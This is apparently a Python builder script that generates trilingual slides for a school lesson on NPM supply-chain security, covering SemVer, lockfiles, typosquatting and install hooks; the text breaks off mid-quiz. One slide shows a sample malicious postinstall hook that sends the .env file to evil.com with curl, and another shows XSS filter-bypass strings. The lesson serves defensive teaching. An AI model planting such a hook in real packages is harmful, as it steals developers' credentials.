#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
scripts/build_9_w12_l35.py — Builder for 9th Grade, Week 12, Lesson 35

Mavzu: NPM Ekotizimi, Tashqi Paketlar va Ta'minot Zanjiri Xavfsizligi (Supply Chain Security & Audit)
Format: Juftlik Dars (80 daqiqa), 14 slayd
Kohorta: 9-sinf (Junior Vibecoders, Full-Stack & DevOps Track)
"""

import os
import sys
import json
import re

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
DEST_DIR = os.path.join(REPO_ROOT, "classes", "9-sinf", "12-hafta", "35-dars-npm-ekotizimi-va-xavfsizlik-auditi")

os.makedirs(DEST_DIR, exist_ok=True)
os.makedirs(os.path.join(DEST_DIR, "studio"), exist_ok=True)

# -----------------------------------------------------------------------------
# 1. SLIDES HTML (14 Slides for 80-min Double Block)
# -----------------------------------------------------------------------------
SLIDES_HTML = """
  <!-- SLIDE 1: TITUL -->
  <section class="slide current" data-phase="Kirish|Введение|Intro" data-time="00:00–05:00" data-slide-index="0">
    <div class="eyebrow"><span class="t" data-ru="9-КЛАСС · 12-Я НЕДЕЛЯ · УРОК 35" data-en="GRADE 9 · WEEK 12 · LESSON 35">9-SINF · 12-HAFTA · 35-DARS</span></div>
    <h1 class="display" data-ru="Экосистема NPM и Безопасность Цепочки Поставок (Supply Chain Security)" data-en="NPM Ecosystem & Supply Chain Security (Audit & Hardening)">NPM Ekotizimi, Tashqi Paketlar va Ta'minot Zanjiri Xavfsizligi</h1>
    <p class="lede" data-ru="Анатомия зависимостей в Node.js: управление package.json и lockfile, семантическое версионирование SemVer, отражение атак Typosquatting и автоматический аудит уязвимостей через npm audit." data-en="The anatomy of Node.js dependencies: mastering package.json and lockfile integrity, SemVer versioning rules, neutralizing Typosquatting exploits, and automated vulnerability auditing with npm audit.">Node.js bog'liqliklari anatomiyasi: package.json va lockfile yaxlitligi, SemVer versiyalash qoidalari, Typosquatting hujumlarini fosh qilish va npm audit orqali zaifliklarni avtomatlashtirilgan zararsizlantirish.</p>
    <div class="hero-split">
      <div class="box">
        <div class="tag" data-ru="Формат урока" data-en="Lesson Format">80 daqiqalik Juftlik Dars</div>
        <h3 data-ru="Анатомия Пакетов" data-en="Package Anatomy">SemVer va Lockfile</h3>
        <p data-ru="В чем разница между ^1.2.0 и ~1.2.0, и почему пропуск package-lock.json может обрушить production-сервер." data-en="The critical difference between ^1.2.0 and ~1.2.0, and why omitting package-lock.json crashes production deployments.">^1.2.0 va ~1.2.0 orasidagi keskin farq hamda nega package-lock.json faylini e'tiborsiz qoldirish serverni sindirishi mumkinligi.</p>
      </div>
      <div class="box">
        <div class="tag" data-ru="Ожидаемый результат" data-en="Deliverable">NPM Security Studio</div>
        <h3 data-ru="Кибер-Аудит" data-en="Cyber Audit">Ta'minot Zanjiri Auditi</h3>
        <p data-ru="Интерактивный терминал: установка пакетов, поиск троянских скриптов postinstall, аудит CVE и очистка зависимостей." data-en="Interactive security terminal: installing packages, detecting malicious postinstall hooks, CVE auditing, and dependency pruning.">Interaktiv kiber-laboratoriya: paketlarni o'rnatish, zararli postinstall skriptlarni fosh qilish, CVE zaifliklarini audit qilish va tozalash.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 2: MANDATORY HW REVIEW -->
  <section class="slide" data-phase="Tahlil|Разбор|Review" data-time="05:00–13:00" data-slide-index="1">
    <div class="eyebrow"><span class="t" data-ru="АНАЛИЗ ДОМАШНЕГО ЗАДАНИЯ · УРОК 34" data-en="HOMEWORK REVIEW · LESSON 34">UY VAZIFASI TAHLILI · 34-DARS</span></div>
    <h2 data-ru="Разбор 34-урока: Валидация Форм, Regex и Санитизация" data-en="Lesson 34 Review: Form Validation, Regex & Sanitization">34-dars Tahlili: Formalar Validatsiyasi, Regex va Tozalash</h2>
    <div class="grid-2">
      <div class="card">
        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--danger);" data-ru="Типичная Ошибка (Pitfall)" data-en="Common Pitfall">Keng Tarqalgan Xato (Pitfall)</div>
        <h3 data-ru="Простая очистка через replace('<', '')" data-en="Naive replace('<', '') Sanitization">Sodda replace() bilan tozalash</h3>
        <p data-ru="Многие ученики пытались фильтровать XSS простой заменой replace('&lt;', ''). Хакеры легко обходят это через двойные теги (&lt;&lt;script&gt;) или обработчики событий onerror=alert(1)." data-en="Many students filtered XSS via basic replace('&lt;', ''). Attackers bypass this trivially using nested tags (&lt;&lt;script&gt;) or inline event handlers like &lt;img onerror=alert(1)&gt;.">Ko'pchilik o'quvchilar XSS hujumini oddiy replace('&lt;', '') orqali tozalashga urindi. Xakerlar buni &lt;&lt;script&gt; yoki &lt;img onerror=alert(1)&gt; kabi inline hodisalar bilan oson chetlab o'tadi.</p>
        <div class="code-block" style="margin-top:10px; font-size:11px;">
<span style="color:#ef4444;">// XATO: Sodda almashtirish oson buziladi</span>
let clean = input.replace(<span style="color:#ef4444;">/&lt;script&gt;/gi</span>, "");
<span style="color:#64748b;">// Kiritish: &lt;scr&lt;script&gt;ipt&gt; -&gt; Baribir &lt;script&gt; qoladi!</span>
        </div>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="Золотой Стандарт" data-en="Golden Standard">Oltin Standart (Best Practice)</div>
        <h3 data-ru="HTML Entity Кодирование и DOMPurify" data-en="HTML Entity Encoding & DOMPurify">HTML Belgilarni Kodlash (Entity Encoding)</h3>
        <p data-ru="Преобразование символов в безопасные HTML-сущности (&amp;lt;, &amp;gt;, &amp;quot;) гарантирует, что браузер отобразит их как чистый текст, не исполняя JavaScript." data-en="Escaping characters into safe HTML entities (&amp;lt;, &amp;gt;, &amp;quot;) forces browsers to treat input strictly as printable text, neutralizing code execution.">Barcha xavfli belgilarni HTML entity kodlariga (&amp;lt;, &amp;gt;, &amp;quot;) almashtirish brauzerni matnni ijro etmasdan, shunchaki xavfsiz ekran matni sifatida chizishga majbur qiladi.</p>
        <div class="code-block" style="margin-top:10px; font-size:11px;">
<span style="color:#22c55e;">// TO'G'RI: HTML Entity orqali to'liq zararsizlantirish</span>
function escapeHTML(str) {
  return str.replace(/[&amp;&lt;&gt;"']/g, m =&gt; ({
    '&amp;': '&amp;amp;', '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '"': '&amp;quot;', "'": '&amp;#39;'
  }[m]));
}
        </div>
      </div>
    </div>
    <div class="grid-2" style="margin-top:14px;">
      <div class="box">
        <span class="badge" data-ru="Блиц-вопрос (30 сек)" data-en="Blitz Question (30s)">Blitz Savol</span>
        <p style="margin-top:4px; font-size:13px;" data-ru="Зачем писать свою сложную валидацию, если можно скачать готовый пакет npm install validator? Есть ли в этом скрытые риски?" data-en="Why handcraft validation if we can run npm install validator? Are there hidden risks in importing external packages?">Nega hamma kodni qo'lda yozish kerak, agar bitta npm install validator buyrug'i bilan tayyor kutubxonani yuklab olish mumkin bo'lsa? Buning qanday yashirin xavflari bor?</p>
      </div>
      <div class="box">
        <span class="badge" data-ru="Мост к теме" data-en="Bridge to Today">Bugungi Mavzuga Ko'prik</span>
        <p style="margin-top:4px; font-size:13px;" data-ru="Внешние пакеты ускоряют разработку в 10 раз, но открывают дверь для 'Supply Chain' атак! Сегодня мы научимся безопасно работать с NPM." data-en="Third-party packages boost velocity by 10x, but invite Supply Chain exploits! Today we master the security perimeter of the NPM ecosystem.">Tashqi paketlar ishlab chiqishni 10 barobar tezlashtiradi, ammo Ta'minot Zanjiri (Supply Chain) orqali kiber-hujum xavfini oshiradi! Bugun NPM xavfsizligini to'liq o'rganamiz.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 3: NPM ECOSYSTEM OVERVIEW -->
  <section class="slide" data-phase="Konsept|Концепт|Concept" data-time="13:00–18:00" data-slide-index="2">
    <div class="eyebrow"><span class="t" data-ru="ЭКОСИСТЕМА NPM · NODE PACKAGE MANAGER" data-en="NPM ECOSYSTEM · NODE PACKAGE MANAGER">NPM EKOTIZIMI · NODE PACKAGE MANAGER</span></div>
    <h2 data-ru="Что такое NPM: Сердце Современного JavaScript" data-en="What is NPM: The Core Engine of Modern JavaScript">NPM Nima? Zamonaviy JavaScript Ekotizimining Yuragi</h2>
    <div class="grid-3">
      <div class="card">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Реестр Пакетов" data-en="Public Registry">Ochiq Reestr (Registry)</div>
        <h3 data-ru="2.5+ Миллиона Модулей" data-en="2.5M+ Packages">2.5M+ Ochiq Paketlar</h3>
        <p data-ru="Глобальное облачное хранилище открытого кода (npmjs.com). Любой разработчик в мире может опубликовать или скачать библиотеку одной командой." data-en="Global cloud repository of open-source libraries (npmjs.com). Any developer worldwide can publish or fetch libraries with a single command.">Butun dunyo dasturchilari o'z kutubxonalarini saqlaydigan global bulutli ombor (npmjs.com). Bitta buyruq bilan dunyodagi istalgan kodni loyihaga qo'shish mumkin.</p>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="CLI Утилита" data-en="CLI Utility">CLI Boshqaruv Vositası</div>
        <h3 data-ru="Командная Строка" data-en="Command-Line Engine">Avtomatlashtirilgan Yuklash</h3>
        <p data-ru="Встроенный в Node.js менеджер пакетов: скачивает архивы, распаковывает в папку node_modules, линкует бинарники и строит граф связей." data-en="Bundled Node.js package manager: downloads tarballs, extracts them into node_modules, resolves binaries, and constructs dependency graphs.">Node.js bilan birga o'rnatiladigan buyruqlar satri vositasi: paketlarni yuklaydi, arxivdan chiqaradi, bog'liqliklar daraxtini tuzadi.</p>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(234,179,8,0.15); color:var(--warning);" data-ru="Манифест Проекта" data-en="Project Manifest">Loyiha Pasporti</div>
        <h3 data-ru="package.json" data-en="package.json">Konfiguratsiya Fayli</h3>
        <p data-ru="Главный паспорт вашего приложения: название, версия, зависимости, исполняемые скрипты (build, start, test) и лицензия." data-en="The primary passport of your software: project metadata, pinned dependencies, lifecycle scripts (start, test), and license keys.">Loyihangizning asosiy pasporti: dastur nomi, versiyasi, zarur kutubxonalar ro'yxati, ishga tushirish skriptlari (scripts) va litsenziyasi.</p>
      </div>
    </div>
    <div class="box" style="margin-top:14px;">
      <strong data-ru="Анатомия папки node_modules:" data-en="Inside node_modules:">node_modules ichida nima yashiringan?</strong>
      <p style="font-size:12px; margin-top:4px;" data-ru="Вы устанавливаете 1 пакет (например, express), но в node_modules появляется 60+ папок! Это транзитивные зависимости — библиотеки, которые нужны самому express." data-en="You install 1 package (e.g. express), but 60+ folders populate node_modules! These are transitive dependencies required by express itself.">Siz bor-yo'g'i bitta paket (masalan, express) o'rnatasiz, lekin node_modules ichida 60 dan ortiq papkalar paydo bo'ladi! Bu tranzitiv bog'liqliklar bo'lib, har birining o'z xavfsizlik darajasi bor.</p>
    </div>
  </section>

  <!-- SLIDE 4: SEMANTIC VERSIONING (SEMVER) -->
  <section class="slide" data-phase="Standart|Стандарт|Standard" data-time="18:00–24:00" data-slide-index="3">
    <div class="eyebrow"><span class="t" data-ru="СЕМАНТИЧЕСКОЕ ВЕРСИОНИРОВАНИЕ · SEMVER" data-en="SEMANTIC VERSIONING · SEMVER RULES">SEMVER STANDARTI · VERSIYALARNING NOZIK JIHATLARI</span></div>
    <h2 data-ru="Магия SemVer: MAJOR.MINOR.PATCH и Символы ^ vs ~" data-en="SemVer Decoded: MAJOR.MINOR.PATCH and Symbols ^ vs ~">SemVer Formulasi: MAJOR.MINOR.PATCH va ^ hamda ~ Belgilari</h2>
    <div class="grid-2">
      <div class="card">
        <h3 data-ru="Формула: X.Y.Z" data-en="Formula: X.Y.Z">Versiya Tuzilishi: X.Y.Z</h3>
        <div style="font-family:monospace; font-size:24px; color:var(--accent); margin:12px 0;">
          <span style="color:#ef4444;">1</span>.<span style="color:#3b82f6;">4</span>.<span style="color:#22c55e;">2</span>
        </div>
        <ul style="font-size:12px; line-height:1.7;">
          <li data-ru="🔴 <strong style='color:#ef4444;'>MAJOR (1):</strong> Критические изменения, ломающие совместимость (Breaking Changes)." data-en="🔴 <strong style='color:#ef4444;'>MAJOR (1):</strong> Incompatible API breaking changes.">🔴 <strong style="color:#ef4444;">MAJOR (1):</strong> Oldingi versiya bilan mos kelmaydigan keskin o'zgarishlar (Breaking Changes).</li>
          <li data-ru="🔵 <strong style='color:#3b82f6;'>MINOR (4):</strong> Новый функционал с сохранением обратной совместимости." data-en="🔵 <strong style='color:#3b82f6;'>MINOR (4):</strong> Backward-compatible new features.">🔵 <strong style="color:#3b82f6;">MINOR (4):</strong> Yangi qulayliklar qo'shilgan, lekin eski kod buzilmaydi.</li>
          <li data-ru="🟢 <strong style='color:#22c55e;'>PATCH (2):</strong> Исправление багов и патчи безопасности (Bug fixes)." data-en="🟢 <strong style='color:#22c55e;'>PATCH (2):</strong> Backward-compatible bug and security fixes.">🟢 <strong style="color:#22c55e;">PATCH (2):</strong> Xatolar va xavfsizlik tuynuklarini yamoqlovchi tuzatishlar.</li>
        </ul>
      </div>
      <div class="card">
        <h3 data-ru="Символы Автообновления в package.json" data-en="Prefix Operators in package.json">Prefiks Belgilari Qanday Ishlaydi?</h3>
        <div class="table-wrap" style="margin-top:8px;">
          <table>
            <thead>
              <tr>
                <th data-ru="Префикс" data-en="Prefix">Belgi</th>
                <th data-ru="Пример" data-en="Example">Namuna</th>
                <th data-ru="Что обновится при npm install?" data-en="Allowed Range">Nimalar avtomatik yangilanadi?</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><code>^</code> (Karetka)</td>
                <td><code>^1.4.2</code></td>
                <td data-ru="MINOR и PATCH: обновится до 1.9.9, но НЕ до 2.0.0" data-en="MINOR & PATCH: up to 1.9.9, but never 2.0.0">MINOR va PATCH: 1.9.9 gacha ruxsat, 2.0.0 taqiqlanadi</td>
              </tr>
              <tr>
                <td><code>~</code> (Tilda)</td>
                <td><code>~1.4.2</code></td>
                <td data-ru="Только PATCH: обновится до 1.4.9, но НЕ до 1.5.0" data-en="PATCH only: up to 1.4.9, but never 1.5.0">Faqat PATCH: 1.4.9 gacha ruxsat, 1.5.0 taqiqlanadi</td>
              </tr>
              <tr>
                <td>Aniq</td>
                <td><code>1.4.2</code></td>
                <td data-ru="Жесткая фиксация: только 1.4.2 (самый безопасный режим)" data-en="Exact pin: strictly 1.4.2 (highest predictability)">Qat'iy fiksatsiya: faqat 1.4.2 (eng xavfsiz holat)</td>
              </tr>
            </tbody>
          </table>
        </div>
        <p style="font-size:11px; margin-top:8px; color:var(--danger);" data-ru="Опасность karetki (^): если автор пакета случайно или намеренно загрузит вредоносный код под версией 1.4.3, ваш npm install автоматически его скачает!" data-en="The ^ danger: if a maintainer's account is compromised and malicious code is pushed as 1.4.3, your npm install will blindly download it!">Karetka (^) xavfi: agar muallifning hisobi buzilib, xaker 1.4.3 versiya sifatida zararli kod joylasa, sizning npm install buyrug'ingiz uni avtomatik yuklab oladi!</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 5: LOCKFILE INTEGRITY -->
  <section class="slide" data-phase="Muhandislik|Инженерия|Engineering" data-time="24:00–29:00" data-slide-index="4">
    <div class="eyebrow"><span class="t" data-ru="ЦЕЛОСТНОСТЬ ЗАВИСИМОСТЕЙ · LOCKFILE" data-en="DEPENDENCY INTEGRITY · THE LOCKFILE">BOG'LIQLIKLAR YAXLITLIGI · LOCKFILE AHAMIYATI</span></div>
    <h2 data-ru="Зачем нужен package-lock.json: Гарантия Одинакового Билда" data-en="Why package-lock.json Matters: Deterministic Builds">Nega package-lock.json Shart? Yaxlitlik Kafolati</h2>
    <div class="grid-2">
      <div class="card">
        <h3 data-ru="Проблема 'У меня работает, а на сервере упало'" data-en="'Works on My Machine' Dilemma">"Menda ishladi, serverda quladi" Muammosi</h3>
        <p data-ru="Без файла package-lock.json команда npm install разрешает версии заново. Если сегодня библиотека обновилась, ваш сервер скачает новую версию, которая может содержать баг." data-en="Without package-lock.json, npm install resolves ranges from scratch. If an upstream package released a breaking patch an hour ago, your production build breaks.">package-lock.json bo'lmasa, npm install barcha versiyalarni boshqatdan qidiradi. Agar kutubxona bugun yangilangan bo'lsa, server boshqa versiyani yuklab, tizim ishlamay qolishi mumkin.</p>
        <div class="code-block" style="margin-top:10px; font-size:11px;">
<span style="color:#64748b;">// package-lock.json ichidagi SHA-512 nazorati</span>
"lodash": {
  "version": "4.17.21",
  "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
  <span style="color:#22c55e;">"integrity": "sha512-v2kMOq9...=="</span>
}
        </div>
      </div>
      <div class="card">
        <h3 data-ru="Разница: npm install против npm ci" data-en="npm install vs npm ci">Katta Farq: npm install vs npm ci</h3>
        <div class="table-wrap" style="margin-top:6px;">
          <table>
            <thead>
              <tr>
                <th data-ru="Команда" data-en="Command">Buyruq</th>
                <th data-ru="Поведение" data-en="Behavior">Qoidasi</th>
                <th data-ru="Где использовать?" data-en="Context">Qayerda ishlatiladi?</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><code>npm install</code></td>
                <td data-ru="Обновляет зависимости и перезаписывает lockfile" data-en="Resolves ranges and updates lockfile">Versiyalarni yangilaydi va lockfile-ni o'zgartiradi</td>
                <td data-ru="Локальная разработка" data-en="Local dev">Lokal kompyuterda</td>
              </tr>
              <tr>
                <td><code>npm ci</code></td>
                <td data-ru="Строго сверяет SHA-512 хеш из lockfile, удаляет старую node_modules" data-en="Strictly enforces lockfile hashes, wipes node_modules">Faqat lockfile bo'yicha o'rnatadi, hashni qat'iy tekshiradi</td>
                <td data-ru="CI/CD и Production сервер" data-en="CI/CD & Production">Production serverda!</td>
              </tr>
            </tbody>
          </table>
        </div>
        <p style="font-size:11px; margin-top:8px; color:var(--success);" data-ru="Золотое правило DevOps: на сервере всегда запускается только npm ci! Никаких скрытых обновлений." data-en="DevOps Golden Rule: always run npm ci in CI/CD pipelines! Never mutate lockfiles on production servers.">DevOps Oltin Qoidasi: production serverda har doim faqat <code>npm ci</code> ishlatiladi! Hech qanday kutilmagan yangilanishlar bo'lmaydi.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 6: DEPENDENCIES VS DEVDEPENDENCIES -->
  <section class="slide" data-phase="Arxitektura|Архитектура|Architecture" data-time="29:00–34:00" data-slide-index="5">
    <div class="eyebrow"><span class="t" data-ru="РАЗДЕЛЕНИЕ СРЕД · БЕЗОПАСНЫЙ ДЕПЛОЙ" data-en="ENVIRONMENT SEGREGATION · SAFE DEPLOY">MUHITLARNI AJRATISH · XAVFSIZ DEPLOY</span></div>
    <h2 data-ru="dependencies против devDependencies: Чистый Production" data-en="dependencies vs devDependencies: Lean & Safe Production">dependencies vs devDependencies: Toza Production Server</h2>
    <div class="grid-2">
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="Для работы сервиса" data-en="Production Runtime">dependencies (--save)</div>
        <h3 data-ru="Боевые библиотеки" data-en="Runtime Dependencies">Haqiqiy Ish Kutubxonalari</h3>
        <p data-ru="Пакеты, без которых веб-сайт не может отвечать на запросы пользователей: Express, SQLite3, JSON Web Token, Bcrypt." data-en="Libraries strictly required to boot and handle customer requests: Express, SQLite3, JWT, Bcrypt.">Server foydalanuvchiga xizmat ko'rsatishi uchun bevosita zarur bo'lgan paketlar: Express, SQLite3, JWT, Bcrypt.</p>
        <div class="code-block" style="margin-top:10px; font-size:11px;">
npm install express jsonwebtoken
        </div>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(234,179,8,0.15); color:var(--warning);" data-ru="Только для разработчика" data-en="Developer Only">devDependencies (--save-dev)</div>
        <h3 data-ru="Инструменты разработки" data-en="Tooling & Linters">Dasturchi Qurollari</h3>
        <p data-ru="Утилиты тестирования, линтеры и сборщики: Jest, Nodemon, ESLint, Webpack. Они НЕ ДОЛЖНЫ попадать на сервер!" data-en="Testing suites, linters, and compilers: Jest, Nodemon, ESLint, Webpack. These MUST NOT be shipped to production!">Faqat kod yozish va testlash uchun kerakli vositalar: Jest, Nodemon, ESLint. Ular serverga aslo tushmasligi kerak!</p>
        <div class="code-block" style="margin-top:10px; font-size:11px;">
npm install --save-dev nodemon eslint jest
        </div>
      </div>
    </div>
    <div class="box" style="margin-top:14px;">
      <strong data-ru="Команда боевого развертывания:" data-en="Production Install Command:">Production Serverda Yuklash Buyrug'i:</strong>
      <p style="font-size:12px; margin-top:4px;" data-ru="Флаг --production гарантирует, что devDependencies не будут скачаны, уменьшая вес контейнера и закрывая 70% потенциальных уязвимостей:" data-en="The --omit=dev (or --production) flag skips devDependencies, shrinking attack surfaces by 70% and slashing image sizes:"><code>npm ci --omit=dev</code> buyrug'i faqat haqiqiy paketlarni yuklaydi, server hajmini kichraytiradi va ehtimoliy zaifliklarning 70% ini chetda qoldiradi.</p>
    </div>
  </section>

  <!-- SLIDE 7: SUPPLY CHAIN ATTACKS - TYPOSQUATTING -->
  <section class="slide" data-phase="Hujum|Атаки|Attacks" data-time="34:00–40:00" data-slide-index="6">
    <div class="eyebrow"><span class="t" data-ru="КИБЕРУГРОЗЫ · АТАКИ НА ЦЕПОЧКУ ПОСТАВОК" data-en="CYBER THREATS · SUPPLY CHAIN ATTACKS">KIBER-XAVFLAR · TA'MINOT ZANJIRI XURUJLARI</span></div>
    <h2 data-ru="Атака Typosquatting: Ловушка на Одну Опечатку" data-en="Typosquatting Exploits: Trapping Single-Character Typos">Typosquatting Hujumi: Bitta Harf Xatosi Tuzog'i</h2>
    <div class="grid-2">
      <div class="card">
        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--danger);" data-ru="Механика Атаки" data-en="Attack Anatomy">Hujum Qanday Ishlaydi?</div>
        <h3 data-ru="Клонирование Популярного Имени" data-en="Spoofing Famous Names">Mashhur Nomlarni Qalbaki Qilish</h3>
        <p data-ru="Злоумышленник регистрирует пакет с именем, похожим на сверхпопулярную библиотеку, рассчитывая на опечатку разработчика:" data-en="Attackers register packages with names almost indistinguishable from widely downloaded libraries, awaiting a typo:">Xakerlar mashhur paket nomlariga juda o'xshash, lekin 1 ta harfi boshqa soxta paketlarni NPM reestriga joylaydi:</p>
        <ul style="font-size:12px; line-height:1.7; margin-top:8px;">
          <li data-ru="Оригинал: <code>cross-env</code> (70 млн скачиваний)" data-en="Original: <code>cross-env</code> (70M weekly downloads)">Haqiqiy: <code>cross-env</code> (70 mln yuklanish)</li>
          <li data-ru="Троян: <strong style='color:#ef4444;'>crossenv</strong> (без дефиса — ворует .env токены)" data-en="Trojan: <strong style='color:#ef4444;'>crossenv</strong> (no hyphen — steals .env keys)">Xakerlik: <strong style="color:#ef4444;">crossenv</strong> (chiziqchasiz — .env kalitlarni o'g'irlaydi)</li>
          <li data-ru="Оригинал: <code>express</code> ➔ Троян: <strong style='color:#ef4444;'>expresss</strong> или <strong style='color:#ef4444;'>expres</strong>" data-en="Original: <code>express</code> ➔ Trojan: <strong style='color:#ef4444;'>expresss</strong> or <strong style='color:#ef4444;'>expres</strong>">Haqiqiy: <code>express</code> ➔ Soxta: <strong style="color:#ef4444;">expresss</strong> yoki <strong style="color:#ef4444;">expres</strong></li>
        </ul>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(168,85,247,0.15); color:#a855f7;" data-ru="Признаки Фальшивки" data-en="Red Flags">Soxta Paketni Fosh Qilish Alomatlari</div>
        <h3 data-ru="Чек-лист Безопасности" data-en="Security Checklist">Kiber-Detektiv Tekshiruvi</h3>
        <ul style="font-size:12px; line-height:1.7; margin-top:8px;">
          <li data-ru="📉 <strong>Количество скачиваний:</strong> у оригинала миллионы в неделю, у фейка — 50-100." data-en="📉 <strong>Download Volume:</strong> legitimate tools have millions; malicious clones have 50-200.">📉 <strong>Yuklanishlar soni:</strong> haqiqiysida haftasiga millionlab, soxtasida 50–200 ta.</li>
          <li data-ru="👤 <strong>Автор и репутация:</strong> отсутствие ссылки на официальный GitHub репозиторий." data-en="👤 <strong>Author & Source:</strong> missing GitHub links or newly registered burner accounts.">👤 <strong>Muallif va obro':</strong> rasmiy GitHub manbasi yo'qligi, yangi ochilgan akkaunt.</li>
          <li data-ru="📜 <strong>История версий:</strong> релиз опубликован пару дней назад сразу как 1.0.0." data-en="📜 <strong>Release History:</strong> brand new package created 2 days ago directly as v1.0.0.">📜 <strong>Versiyalar tarixi:</strong> 2 kun oldin birdaniga 1.0.0 sifatida chiqarilgani.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- SLIDE 8: MALICIOUS POSTINSTALL SCRIPTS -->
  <section class="slide" data-phase="Hujum|Атаки|Attacks" data-time="40:00–45:00" data-slide-index="7">
    <div class="eyebrow"><span class="t" data-ru="ВРЕДОНОСНЫЕ СКРИПТЫ · УДАЛЕННЫЙ ВЗЛОМ" data-en="MALICIOUS HOOKS · REMOTE CODE EXECUTION">XAVFLI SKRIPTLAR · RCE XURUJLAR</span></div>
    <h2 data-ru="Троянский Конь: Скрипты preinstall и postinstall" data-en="Trojan Hooks: Abuse of preinstall & postinstall">Troyalik Ot: preinstall va postinstall Skriptlari</h2>
    <div class="grid-2">
      <div class="card">
        <h3 data-ru="Как код исполняется БЕЗ вашего ведома" data-en="Code Execution Without Import">Kodni Chaqirmasdan Ishga Tushirish</h3>
        <p data-ru="NPM позволяет пакетам запускать bash-скрипты сразу после скачивания. Вы даже не написали require('lib') — вредоносный код уже запустился в вашей системе!" data-en="NPM allows packages to trigger shell scripts upon downloading. Before you even write require('lib'), the exploit already runs on your machine!">NPM paketlarga yuklanishi bilanoq tizimda buyruqlarni ishlatishga ruxsat beradi. Siz hali kodda import qilmasingizdanoq zararli skript avtomatik bajariladi!</p>
        <div class="code-block" style="margin-top:10px; font-size:11px;">
<span style="color:#64748b;">// package.json ichidagi zararli qator</span>
"scripts": {
  <span style="color:#ef4444;">"postinstall": "node ./malware.js &amp;&amp; curl -X POST https://evil.com/steal --data @.env"</span>
}
        </div>
      </div>
      <div class="card">
        <h3 data-ru="Линия Защиты: Флаг --ignore-scripts" data-en="Defense Line: --ignore-scripts">Himoya Qalqoni: --ignore-scripts</h3>
        <p data-ru="Вы можете навсегда запретить сторонним пакетам запускать системные команды на вашем компьютере:" data-en="You can permanently disable third-party lifecycle execution via global or project-level config:">Tashqi paketlarning kompyuteringizda avtomatik buyruq bajarishini butunlay taqiqlash mumkin:</p>
        <div class="code-block" style="margin-top:10px; font-size:11.5px;">
<span style="color:#22c55e;"># 1. Bitta o'rnatishda bloklash</span>
npm install package-name --ignore-scripts

<span style="color:#3b82f6;"># 2. Butun loyiha uchun .npmrc fayliga yozish</span>
echo "ignore-scripts=true" &gt;&gt; .npmrc
        </div>
        <p style="font-size:11px; margin-top:8px; color:var(--ink-secondary);" data-ru="После этого никакой скрипт postinstall не выполнится без вашего явного ручного разрешения." data-en="This guarantees zero unauthorized scripts run in the background during installation.">Bu orqali hech qanday postinstall skripti sizning ruxsatingizsiz tizimga kira olmaydi.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 9: INTERACTIVE BLITZ QUIZ -->
  <section class="slide" data-phase="Viktorina|Викторина|Quiz" data-time="45:00–50:00" data-slide-index="8">
    <div class="eyebrow"><span class="t" data-ru="БЛИЦ-ПРОВЕРКА ЗНАНИЙ · 4 ВОПРОСА" data-en="KNOWLEDGE CHECK · 4 BLITZ QUESTIONS">BLITZ KIBER-TEST · 4 TA TEZKOR SAVOL</span></div>
    <h2 data-ru="Интерактивный Квиз: Проверь Свою Кибер-Бдительность" data-en="Interactive Quiz: Test Your Cyber Vigilance">Interaktiv Quiz: Kiber-Hushyorlikni Sinash</h2>
    <div class="grid-2">
      <div class="card" style="padding:14px;">
        <span class="badge" style="background:var(--accent); color:#fff;">1</span>
        <strong style="font-size:12px; display:block; margin:6px 0;" data-ru="Если в package.json указано '^2.3.1', какую максимальную версию скачает npm install?" data-en="If package.json specifies '^2.3.1', what is the highest version npm install permits?">Agar package.json da '^2.3.1' bo'lsa, npm install qaysi maksimal versiyani yuklashi mumkin?</strong>
        <p style="font-size:11px; color:var(--ink-secondary);" data-ru="A) 2.3.9 | B) 2.99.9 | C) 3.0.0" data-en="A) 2.3.9 | B) 2.99.9 | C) 3.0.0">A) 2.3.9 | B) 2.99.9 | C) 3.0.0</p>
        <div style="margin-top:6px; font-weight:700; color:var(--success); font-size:11px;" data-ru="Ответ: B (2.99.9 — все версии в пределах MAJOR 2)" data-en="Answer: B (2.99.9 — any release under MAJOR 2)">Javob: B (2.99.9 — MAJOR 2 doirasidagi barcha versiyalar)</div>
      </div>
      <div class="card" style="padding:14px;">
        <span class="badge" style="background:#a855f7; color:#fff;">2</span>
        <strong style="font-size:12px; display:block; margin:6px 0;" data-ru="Какая команда гарантирует сборку строго по package-lock.json на продакшене?" data-en="Which command guarantees 100% lockfile fidelity on production servers?">Production serverda faqat package-lock.json asosida o'rnatish uchun qaysi buyruq ishlatiladi?</strong>
        <p style="font-size:11px; color:var(--ink-secondary);" data-ru="A) npm update | B) npm install | C) npm ci" data-en="A) npm update | B) npm install | C) npm ci">A) npm update | B) npm install | C) npm ci</p>
        <div style="margin-top:6px; font-weight:700; color:var(--success); font-size:11px;" data-ru="Ответ: C (npm ci — удаляет node_modules и сверяет SHA-512)" data-en="Answer: C (npm ci — cleans node_modules and verifies SHA-512)">Javob: C (npm ci — SHA-512 yaxlitlik hashlarini qat'iy tekshiradi)</div>
      </div>
      <div class="card" style="padding:14px;">
        <span class="badge" style="background:var(--warning); color:#fff;">3</span>
        <strong style="font-size:12px; display:block; margin:6px 0;" data-ru="В какую секцию зависимостей должен устанавливаться тестовый фреймворк Jest?" data-en="Which dependency section should testing framework Jest belong to?">Jest testlash freymvorki qaysi bo'limga o'rnatilishi shart?</strong>
